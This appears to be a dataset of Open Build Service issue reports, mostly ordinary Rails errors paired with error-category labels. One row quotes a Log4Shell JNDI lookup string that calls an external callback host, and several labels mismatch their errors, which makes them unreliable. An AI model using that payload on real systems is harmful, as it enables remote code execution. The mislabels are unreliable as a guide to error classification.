None,rendering,"# incompatible character encodings: ASCII-8BIT and UTF-8
## Summary
## URL
[https://build.opensuse.org/](https://build.opensuse.org/)
### Where
main#index

### Occured
Jan 31 10:28pm

### Similar
0

## Params
{
  ""action"" => ""index"",
  ""controller"" => ""webui/main""
}

## Session
{
  ""_csrf_token"" => ""NKbm1hbiA1RDEwSw4DLAMhMiIvEj6PObE/fD552P3gE="",
  ""session_id"" => ""71efcfdf7614699654176f302a3c0056""
}

## Backtrace
60:  app/views/layouts/webui/webui.html.haml -> **_app_views_layouts_webui_webui_html_haml__2700210924771806649_47445553566900**
247:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/base.rb -> **public_send**
247:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/base.rb -> **_run**
154:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/template.rb -> **block in render**
205:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/notifications.rb -> **instrument**
345:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/template.rb -> **instrument_render_template**
152:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/template.rb -> **render**
72:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/renderer/template_renderer.rb -> **block in render_with_layout**
205:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/notifications.rb -> **instrument**
70:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/renderer/template_renderer.rb -> **render_with_layout**
55:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/renderer/template_renderer.rb -> **render_template**
11:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/renderer/template_renderer.rb -> **render**
61:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/renderer/renderer.rb -> **render_template_to_object**
29:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/renderer/renderer.rb -> **render_to_object**
117:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/rendering.rb -> **block in _render_template**
273:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/base.rb -> **in_rendering_context**
116:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/rendering.rb -> **_render_template**
218:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/streaming.rb -> **_render_template**
103:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/rendering.rb -> **render_to_body**
52:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/rendering.rb -> **render_to_body**
142:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/renderers.rb -> **render_to_body**
25:  /GEM_ROOT/gems/actionpack-6.1.4/lib/abstract_controller/rendering.rb -> **render**
36:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/rendering.rb -> **render**
46:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/instrumentation.rb -> **block (2 levels) in render**
308:  /usr/lib64/ruby/2.5.0/benchmark.rb -> **realtime**
14:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/core_ext/benchmark.rb -> **ms**
46:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/instrumentation.rb -> **block in render**
86:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/instrumentation.rb -> **cleanup_view_runtime**
34:  /GEM_ROOT/gems/activerecord-6.1.4/lib/active_record/railties/controller_runtime.rb -> **cleanup_view_runtime**
45:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/instrumentation.rb -> **render**
35:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/implicit_render.rb -> **default_render**
6:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/basic_implicit_render.rb -> **block in send_action**
6:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/basic_implicit_render.rb -> **tap**
6:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/basic_implicit_render.rb -> **send_action**
228:  /GEM_ROOT/gems/actionpack-6.1.4/lib/abstract_controller/base.rb -> **process_action**
30:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/rendering.rb -> **process_action**
42:  /GEM_ROOT/gems/actionpack-6.1.4/lib/abstract_controller/callbacks.rb -> **block in process_action**
106:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/callbacks.rb -> **run_callbacks**
41:  /GEM_ROOT/gems/actionpack-6.1.4/lib/abstract_controller/callbacks.rb -> **process_action**
22:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/rescue.rb -> **process_action**
34:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/instrumentation.rb -> **block in process_action**
203:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/notifications.rb -> **block in instrument**
24:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/notifications/instrumenter.rb -> **instrument**
203:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/notifications.rb -> **instrument**
33:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/instrumentation.rb -> **process_action**
249:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal/params_wrapper.rb -> **process_action**
27:  /GEM_ROOT/gems/activerecord-6.1.4/lib/active_record/railties/controller_runtime.rb -> **process_action**
165:  /GEM_ROOT/gems/actionpack-6.1.4/lib/abstract_controller/base.rb -> **process**
39:  /GEM_ROOT/gems/actionview-6.1.4/lib/action_view/rendering.rb -> **process**
190:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal.rb -> **dispatch**
254:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_controller/metal.rb -> **dispatch**
50:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/routing/route_set.rb -> **dispatch**
33:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/routing/route_set.rb -> **serve**
19:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/routing/mapper.rb -> **block in &lt;class:Constraints&gt;**
49:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/routing/mapper.rb -> **serve**
50:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/journey/router.rb -> **block in serve**
32:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/journey/router.rb -> **each**
32:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/journey/router.rb -> **serve**
842:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/routing/route_set.rb -> **call**
77:  /GEM_ROOT/gems/flipper-0.23.1/lib/flipper/middleware/memoizer.rb -> **memoized_call**
42:  /GEM_ROOT/gems/flipper-0.23.1/lib/flipper/middleware/memoizer.rb -> **call**
37:  config/initializers/wrap_parameters.rb -> **call**
44:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/deflater.rb -> **call**
15:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/tempfile_reaper.rb -> **call**
27:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/etag.rb -> **call**
27:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/conditional_get.rb -> **call**
12:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/head.rb -> **call**
22:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/http/permissions_policy.rb -> **call**
18:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/http/content_security_policy.rb -> **call**
266:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/session/abstract/id.rb -> **context**
260:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/session/abstract/id.rb -> **call**
689:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/cookies.rb -> **call**
27:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/callbacks.rb -> **block in call**
98:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/callbacks.rb -> **run_callbacks**
26:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/callbacks.rb -> **call**
18:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/actionable_exceptions.rb -> **call**
32:  /GEM_ROOT/gems/airbrake-9.4.3/lib/airbrake/rack/middleware.rb -> **call!**
21:  /GEM_ROOT/gems/airbrake-9.4.3/lib/airbrake/rack/middleware.rb -> **call**
29:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/debug_exceptions.rb -> **call**
33:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/show_exceptions.rb -> **call**
15:  /GEM_ROOT/gems/lograge-0.11.2/lib/lograge/rails_ext/rack/logger.rb -> **call_app**
26:  /GEM_ROOT/gems/railties-6.1.4/lib/rails/rack/logger.rb -> **block in call**
99:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/tagged_logging.rb -> **block in tagged**
37:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/tagged_logging.rb -> **tagged**
99:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/tagged_logging.rb -> **tagged**
26:  /GEM_ROOT/gems/railties-6.1.4/lib/rails/rack/logger.rb -> **call**
81:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/remote_ip.rb -> **call**
81:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/remote_ip.rb -> **call**
19:  /GEM_ROOT/gems/request_store-1.5.1/lib/request_store/middleware.rb -> **call**
26:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/request_id.rb -> **call**
24:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/method_override.rb -> **call**
22:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/runtime.rb -> **call**
29:  /GEM_ROOT/gems/activesupport-6.1.4/lib/active_support/cache/strategy/local_cache_middleware.rb -> **call**
14:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/executor.rb -> **call**
18:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/lock.rb -> **call**
110:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/sendfile.rb -> **call**
92:  /GEM_ROOT/gems/actionpack-6.1.4/lib/action_dispatch/middleware/host_authorization.rb -> **call**
539:  /GEM_ROOT/gems/railties-6.1.4/lib/rails/engine.rb -> **call**
207:  /GEM_ROOT/gems/railties-6.1.4/lib/rails/railtie.rb -> **public_send**
207:  /GEM_ROOT/gems/railties-6.1.4/lib/rails/railtie.rb -> **method_missing**
74:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/urlmap.rb -> **block in call**
58:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/urlmap.rb -> **each**
58:  /GEM_ROOT/gems/rack-2.2.3/lib/rack/urlmap.rb -> **call**
107:  /usr/lib64/ruby/gems/2.5.0/gems/passenger-6.0.8/src/ruby_supportlib/phusion_passenger/rack/thread_handler_extension.rb -> **process_request**
149:  /usr/lib64/ruby/gems/2.5.0/gems/passenger-6.0.8/src/ruby_supportlib/phusion_passenger/request_handler/thread_handler.rb -> **accept_and_process_next_request**
110:  /usr/lib64/ruby/gems/2.5.0/gems/passenger-6.0.8/src/ruby_supportlib/phusion_passenger/request_handler/thread_handler.rb -> **main_loop**
416:  /usr/lib64/ruby/gems/2.5.0/gems/passenger-6.0.8/src/ruby_supportlib/phusion_passenger/request_handler.rb -> **block (3 levels) in start_threads**
113:  /usr/lib64/ruby/gems/2.5.0/gems/passenger-6.0.8/src/ruby_supportlib/phusion_passenger/utils.rb -> **block in create_thread_and_abort_on_exception**",character_encoding,issue-12148.md
None,runtime,undefined method `[]' for nil:NilClass,['nil_reference_error'],issue-12152.md
cobbler,trigger_workflow#create,undefined method `[]' for nil:NilClass,RuntimeError,issue-12155.md
None,Database Execution,Mysql2::Error: Field 'binary_arch' doesn't have a default value,Missing Required Field,issue-12156.md
None,Controller Logic,"Repository(#47000937688880) expected, got nil which is an instance of NilClass(#47000888827420)",Missing Dependencies,issue-12171.md
multipath-tools,triggering_rebuild,"The 'rebuild_package' workflow did not run OBS services, leading to an outdated build.",missing_service_execution,issue-12173.md
None,create_workflow_run,undefined method `workflow_runs' for #<Token::Service:0x0000557e87a01148>,MissingMethodError,issue-12176.md
gsmartcontrol,workflow_artifacts_saving,artifacts column was being saved as an invalid JSON string 'null' leading to 500 Internal Server Error,InvalidDataStorage,issue-12218.md
python-orangebox,delayed_job#StagingProjectAcceptJob,"&lt;status code=""400""&gt;
  &lt;summary&gt;Package python-orangebox is controlled by obs-scm&lt;/summary&gt;
&lt;/status&gt;",MissingDependencies,issue-12222.md
None,runtime,undefined method `index' for nil:NilClass,nil_object_method_call,issue-12224.md
None,runtime,"undefined method `name' for ""openSUSE:Maintenance:17392"":String",['undefined_method'],issue-12227.md
prometheus-postgres_exporter,deletions#new,"No route matches {""action""=>""toggle"", ""controller""=>""webui/watched_items"", ""number""=>nil, ""package_name""=>""prometheus-postgres_exporter"", ""project_name""=>""server:monitoring""}, possible unmatched constraints: [:number]",MissingParameters,issue-12240.md
glibc:utils,live_build_log,"undefined method `persisted?' for ""glibc:utils"":String",MissingMethodError,issue-12242.md
None,Unstaging,"<status code=""unknown_project"">
  <summary>Project not found: home:sbrabec:branches:graphics</summary>
</status>",MissingDependencies,issue-12250.md
python-voila:test,build,undefined method `encode!' for nil:NilClass,RuntimeError,issue-12259.md
None,None,None,None,issue-12267.md
pam,installing,file /etc/environment from install of pam-1.5.2-25.1.aarch64 conflicts with file from package setup-2.13.9.1-2.fc35.noarch,file_conflict,issue-12285.md
None,dependency_resolution,"unsupported cache folder depth
Bundler Error: Your bundle requires gems that depend on each other, creating an infinite loop. Please remove either gem 'faraday' or gem 'faraday-excon' and try again.","['infinite_dependency_loop', 'missing_dependencies']",issue-12298.md
None,dependency_management,"unsupported cache folder depth
unsupported cache folder depth
unsupported cache folder depth",missing_dependencies,issue-12323.md
geopm,trigger_workflow#create,"undefined method `deep_symbolize_keys' for [{""branch_package""=>{""source_project""=>""home:bgeltz"", ""source_package""=>""geopm"", ""target_project""=>""releases""}}]:Array",IncompatibleArchitectureInstructions,issue-12327.md
None,dependency_management,unsupported cache folder depth,missing_dependencies,issue-12336.md
home:jengelh,metadata_submission,"Server returned an error: HTTP Error 500: Internal Server Error
Date: Thu, 24 Mar 2022 11:33:06 GMT
Server: Apache/2.4.51 (Linux/SUSE)
Strict-Transport-Security: max-age=31536000
x-request-id: 0f899c7a-4da3-4bcb-9d16-afddc5861941
x-runtime: 0.430667
x-powered-by: Phusion Passenger(R) 6.0.12
content-length: 131
status: 500 Internal Server Error
content-type: application/xml; charset=utf-8
Connection: close

b'<?xml version=""1.0"" encoding=""UTF-8""?>\n<hash>\n  <status type=""integer"">500</status>\n  <error>Internal Server Error</error>\n</hash>\n'",Invalid Repository ID,issue-12344.md
test,loading build logs,Internal server error when accessing build logs for repository containing '%',internal_server_error,issue-12346.md
test,build_log_loading,Unable to load build log for repository 'st?oh=no&anyway',missing_resource,issue-12347.md
sta ndard,API request handling,HTTP Error 404: project 'home:jengelh' has no repository 'sta+ndard',Incorrect URI decoding,issue-12348.md
test,webui_loading,No live log available: project 'home:jengelh' has no repository 'st andard',webui_issue,issue-12349.md
None,UI_operation,Can't add repository: Name 15.4 is already used by a repository of this project,Configuration_error,issue-12352.md
None,dependency_management,unsupported cache folder depth,missing_dependencies,issue-12359.md
None,dependency_management,unsupported cache folder depth,missing_dependencies,issue-12360.md
test,repository_access,404 Not Found,illegal_character_in_name,issue-12363.md
dashboard,Frontend performance,Package entry page is awfully slow for packages with a lot of history,Refactoring,issue-12406.md
None,account_creation,No verification email was sent during account creation. Multiple attempts to trigger email verification resulted in no emails received.,['missing_email_verification'],issue-12450.md
mobac,upload_and_download,"server does not accept filelist: <directory><entry hash=""..."" name=""Mobile Atlas Creator 2.2.2.zip"" /><entry md5=""..."" name=""mobac.changes"" />... missing: <directory error=""missing"" name=""mobac""><entry hash=""..."" name=""Mobile Atlas Creator 2.2.2.zip"" /></directory>","Bug,Frontend,P2",issue-12457.md
rubygem-passenger-apache2,Application startup,/usr/lib64/ruby/2.5.0/rubygems/core_ext/kernel_require.rb:59:in `require': cannot load such file -- phusion_passenger (LoadError),Missing dependencies,issue-12459.md
libtorrent,frontend,Security warning: an embedded <script> tag on another site requested protected JavaScript.,Cross-Origin Request,issue-12468.md
None,backend/api,"&lt;status code=""400""&gt;
  &lt;summary&gt;excess hash entries: sourcedep&lt;/summary&gt;
&lt;/status&gt;","['missing_dependencies', 'incompatible_architecture_instructions']",issue-12469.md
golang-github-prometheus-promu,Maintenance Request Processing,"HTTP Error 404: Not Found
not_found
Couldn't find Package",Duplicate Source Submission,issue-12548.md
OBS,Configuration and Binding,Backend servers refuse to bind to IPv6 hostname; services bind to IPv4 only despite configured FQDN with IPv6 AAAA record.,Network Configuration,issue-12550.md
tslib,show,"undefined method `bugowner_emails' for nil:NilClass

    @bugowners_mail = (@package.bugowner_emails + @project.bugowner_emails).uniq
                               ^^^^^^^^^^^^^^^^ #",Missing Dependencies,issue-12552.md
network/bind,None,None,Bug,issue-12590.md
kiwi,dependency_resolution,"unresolvable: nothing provides librsvg = 2.46.5 needed by librsvg-lang
nothing provides gimp = 2.10.12 needed by gimp-plugins-python
Problem: the to be installed patterns-kde-kde_plasma-20220215-lp154.1.2.noarch requires 'plasma5-session', but this requirement cannot be provided",['missing_dependencies'],issue-12600.md
irssi,Publishing configuration,Publishing is disabled in projects created by SCM/CI integration.,Configuration Issue,issue-12609.md
,,,,issue-12619.md
devel:kubic:libcontainers:testing,installation,E: The repository 'https://download.opensuse.org/repositories/devel:/kubic:/libcontainers:/testing/xUbuntu_20.04  Release' does not have a Release file.,missing_release_file,issue-12622.md
openSUSE/open-build-service,set_flags step,missing keyword: :project_name,Bug,issue-12637.md
open-build-service,Input Validation,"The value entered is not correctly validated and is accepted even if it's in an incorrect format (e.g., '2022-03-08 10:00 PT'). This leads to improper conversion to UTC.",Missing Validation,issue-12649.md
None,tokens#create,"param is missing or the value is empty: type

               description

               scm_token",MissingInput,issue-12655.md
podman,package_download,Hash mismatches during package download from provo-mirror.opensuse.org,network_issue,issue-12656.md
None,None,None,None,issue-12663.md
,,,,issue-12685.md
Passenger RubyApp: /srv/www/obs/api,rendering,"Requiring user, but found nobody

Backtrace:
240:  app/models/user.rb -> **session!**
2:  app/views/webui/users/tokens/users/_breadcrumb_items.html.haml -> **_app_views_webui_users_tokens_users__breadcrumb_items_html_haml__3244865770822253513_114120**
247:  /GEM_ROOT/gems/actionview-6.1.5.1/lib/action_view/base.rb -> **public_send**
...
","['Bug', 'Frontend']",issue-12695.md
None,notifications#update,undefined method `commentable' for nil:NilClass,missing_dependencies,issue-12704.md
osc,data_input,"OBS converts UTF-8 emojis like :robot: into incorrect characters (e.g., ð¤) when submitted via `osc`.",['encoding_issue'],issue-12707.md
argon2,package#revisions,"undefined method `check_source_access?` for nil:NilClass

    unless @package.check_source_access?",Bug,issue-12709.md
openblas-devel,repository_addition,File '/repositories/devel:/languages:/python:/backports/SLE_15_SP3/devel:languages:python:backports.repo' not found on medium 'https://download.opensuse.org/',missing_dependencies,issue-12715.md
onedrive,param_missing,repository param is missing or the value is empty,['missing_parameters'],issue-12727.md
onedrive,rendering,`render file:` should be given the absolute path to a file. '/srv/www/obs/api/public/404' was given instead,MissingDependencies,issue-12729.md
trigger_workflow,create,[production][trigger_workflow#create] undefined method `to_sym' for {:event=>'push'}:Hash,InvalidConfiguration,issue-12742.md
None,Execution,[no implicit conversion of nil into String],['Runtime Error'],issue-12747.md
open-build-service,docker_build,"usermod: UID '0' already exists
ERROR: Service 'frontend' failed to build: The command '/bin/sh -c usermod -u $CONTAINER_USERID frontend' returned a non-zero code: 4","['user_permission', 'docker_configuration']",issue-12762.md
None, redirection logic,Redirecting from '/user/show/$user' to incorrect URL,"Bug, Frontend",issue-12785.md
software_package_name,error_stage,error_log_content,predefined_error_categories,file_name
,,,,issue-10045.md
,,,,issue-10122.md
,,,,issue-10197.md
None,comments#create,bad argument (expected URI object or URI string),Bug,issue-10259.md
,,,,issue-10439.md
,build,Sometimes old configurations from previous builds pop as /home/abuild is just partly cleaned before a new build.,incompatible_configuration,issue-10497.md
,,,,issue-10502.md
,Frontend - Package Description Editing,Nothing happens when using the 'Cancel' button; it stays in edit mode.,Bug,issue-10510.md
,clockwork,Exceptions in clockwork do not appear in errbit. They 'just' appear in the clockworkd logfile (`log/clockworkd.clock.output`),,issue-10523.md
,,,,issue-10566.md
,,,,issue-10611.md
,Authentication Process,"500: Internal Server Error
Oooops, something went terribly wrong, our application crashed :-(
Server error message:
Either username or password is incorrect or you are not allowed to use this service.","Application Crash, Authentication Failure",issue-10697.md
,,,,issue-10761.md
frontend-base,Package#show layout rendering,Long build results string interferes on the Package#show layout,"Layout issue, Potential frontend bug",issue-10805.md
,,,,issue-11198.md
,,,,issue-11273.md
,,,,issue-11389.md
,,,,issue-11396.md
,Password Recovery Process,The system did not send a password reset token to the email address associated with the legacy account.,Authentication Failure,issue-11442.md
,Project Access Management,No User in OBS Account. Unable to add or delete projects.,Access Control Issue,issue-11664.md
,,,,issue-11680.md
,,,,issue-11686.md
,webui_diff_fetching,The web UI displays a button 'Crunching the latest data. Refresh again in a few seconds.' and does not update even when refreshed.,Frontend_Bug,issue-11770.md
,,,,issue-11827.md
,,,,issue-11859.md
,Webhook Handling,"The first entry is a request with a response code of `400` and a body saying that:

```
<status code=""bad_request"">
  <summary>Failed to parse the JSON payload of your request</summary>
</status>
```",Bad Request,issue-11865.md
,,,,issue-11958.md
,Building containers,Output of some errors on unresolvable packages which are installed using zypper in the Dockerfile,missing dependencies,issue-11992.md
,dispatcher service cannot see worker threads,"All the threads of worker is running, but dispatcher service cannot see it, then all the jobs stuck.",communication_issue,issue-12014.md
,,,,issue-12121.md
,,unsupported cache folder depth,configuration_issue,issue-12332.md
,,,,issue-12356.md
,Frontend,The select boxes for the token type selection in the token create UI `/my/tokens/new` stopped working.,Bug,issue-12452.md
,,,,issue-12496.md
,Preparing sources,curl: (6) Could not resolve host: github.com,network_issue,issue-12569.md
,,,,issue-12588.md
uwsgi-ld-noexecstack.patch,parsing_mentioned_issues,"Wrong parsing of Mentioned issues
Expected: [gh#unbit/uwsgi#2436]
Actual: [gh#unbit/uwsgi#2436] and [i#2436]",incorrect_parsing,issue-12614.md
None,commit_records,"Requiring user, but found nobody
app/models/user.rb:240:in `session!'
app/models/project.rb:1455:in `delete_on_backend'
... (truncated for brevity)",missing_user,issue-12796.md
None,Committing Transaction,"Requiring user, but found nobody. The issue seems to be related to a missing or invalid user session during a transaction commit process.",Invalid User Session,issue-12797.md
None,MIME negotiation,"The provided string ""${jndi:ldap://${hostName}.accept.c9p514lp22nida2n1gk0gzbyom9bamf9q.oast.live}"" is not a valid MIME type.",Invalid Input,issue-12804.md
None,database_query,Mysql2::Error: Unknown column 'projects.name' in 'where clause',database_issue,issue-12806.md
None,trigger#create,"undefined method `start_with?' for nil:NilClass
return name if name.start_with?('._patchinfo:', '._product:')
^^^^^^^^^^
",nil_object_method_call,issue-12813.md
None,MIME Negotiation,"actionpack-6.1.5.1/lib/action_dispatch/http/mime_negotiation.rb:55:in `block in accepts': ""accept-encoding"": ""gzip"" is not a valid MIME type",Invalid MIME Type,issue-12814.md
None,None,None,None,issue-12826.md
None,runtime,undefined method `owned_by?' for nil:NilClass,nil_reference_error,issue-12827.md
vis,Delete File Process,Package vis is controlled by obs-scm,Access Control Issue,issue-12835.md
None,Frontend,"# undefined method `render_error&#39; for #&lt;Webui::Staging::WorkflowsController:0x00000000035980&gt;

        render_error status: 403,
        ^^^^^^^^^^^^",MethodMissing,issue-12850.md
,,,,issue-12873.md
None,runtime,"undefined method `owned_by?' for nil:NilClass
raise Pundit::NotAuthorizedError, 'you are not authorized to access those workflow runs' unless token.owned_by?(user)",nil_reference_error,issue-12874.md
open-build-service,startup,"WARNING: index 'package_core': no fields configured (use rt_field directive) - NOT SERVING
WARNING: index 'project_core': no fields configured (use rt_field directive) - NOT SERVING
WARNING: index 'package': no such local index 'package_core', SKIPPED
WARNING: index 'package': no valid local/remote indexes in distributed index - NOT SERVING
WARNING: index 'project': no such local index 'project_core', SKIPPED
WARNING: index 'project': no valid local/remote indexes in distributed index - NOT SERVING
FATAL: no valid indexes to serve",missing configuration,issue-12888.md
gnome-branding-Leap,database_query,"Mysql2::Error: Illegal mix of collations (utf8mb3_bin,IMPLICIT) and (utf8mb4_unicode_ci,COERCIBLE) for operation '='",collation_mismatch,issue-12895.md
,,,,issue-12902.md
,,,,issue-12909.md
libappindicator:gtk2,Deleting Binaries,Error while triggering wipe binaries for home:coolo:alp/libappindicator: unknown package: libappindicator%3Agtk2 404 unknown package: libappindicator%3Agtk2,Unknown Package Error,issue-12913.md
None,Controller/View Rendering,undefined method `request_beta_show_path' for #<BsRequestActivityTimelineComponent:0x00007f0edd33fbd8>,Undefined Method/Error,issue-12917.md
,,,,issue-12937.md
gcc-9,build,"nothing provides gcc-9 = 9.3.0, (got version 9.4.0)",missing dependencies,issue-12960.md
None,request#show,"undefined method `project' for nil:NilClass
@review.package.project.users",runtime_error,issue-12982.md
,,,,issue-13011.md
,,,,issue-13013.md
ctop,Searching requests,Server returned an error: HTTP Error 404: Not Found,HTTP Error,issue-13018.md
gitlab,Server response handling,"Server responded with code 502, message: {:message=>""GitLab is not responding""}. Request URI: https://gitlab.gnome.org/api/v4/projects/21471/statuses/485281fd001436b1b9e4da10cf185b7c1a8a3e39",network_issues,issue-13032.md
bs_request_action.rb,rendering,"undefined method `commit' for nil:NilClass
package.commit(source_rev) || package.commit
       ^^^^^^^",nil_reference_error,issue-13065.md
bash,API response inconsistency,"The `/request?view=collection&package=bash&states=new,review` query returns requests for all packages instead of filtering by the specified package.",API Bug,issue-13075.md
,New request workflow,"No explicit error log content provided, but the issue mentions 'got declined' and 'no option to revoke the SR'.",Bug,issue-13087.md
,,,,issue-13094.md
netcfg,installation,[18s] warning: /etc/hosts created as /etc/hosts.rpmnew,configuration_issue,issue-13104.md
onedrive,Parameter Missing or Empty,"param is missing or the value is empty: repository
Did you mean?  project
               controll...
               controller
               architecture
               action #",Missing Parameters,issue-13105.md
bunny-2.19.0,init_connection,"# undefined method `server_properties' for #<AMQ::Protocol::Connection::Close:0x00007f1acad03478 @reply_code=501, @reply_text=""FRAME_ERROR - type 65, all octets = <<>>: {frame_too_large,1342177289,131064}"", @class_id=0, @method_id=0>",runtime_error,issue-13106.md
bunny-2.19.0,init_connection,"# undefined method `decode_payload' for #<AMQ::Protocol::HeartbeatFrame:0x00007f50efbdbc98 @payload="""", @channel=0>\n\n      connection_start = @transport.read_next_frame.decode_payload\n                                                   ^^^^^^^^^^^^^^^ #",Incompatible Method Call,issue-13107.md
libfuoten,validation,"undefined method `keys' for ""push"":String

- unsupported_filter_values << filter unless value.keys.all? { |filter_type| SUPPORTED_FILTER_VALUES.include?(filter_type.to_sym) }",logic_error,issue-13118.md
myxer,Compression Format Change Not Indicated,"The webui only shows the information from the changelog but there is no indication at all that the tarball changed in any form or the other (the content of the tarball stayed unchanged, it's really only the compression format and in this case specifically the size of the tarball).",UI Bug,issue-13125.md
None,Database Operation,Mysql2::Error: Duplicate entry 'nnnnnoooooooo' for key 'users_login_index',Data Integrity,issue-13137.md
aaa_base,package retrieval or build,404 repository 'openSUSE:Factory/standard' has no architecture 'aarch64',missing architecture support,issue-13147.md
None,None,None,None,issue-13152.md
vlc,Repo Link Click,repository 'openSUSE:Factory/standard' has no architecture 'aarch64' 404 repository 'openSUSE:Factory/standard' has no architecture 'aarch64',Missing Architecture Instructions,issue-13175.md
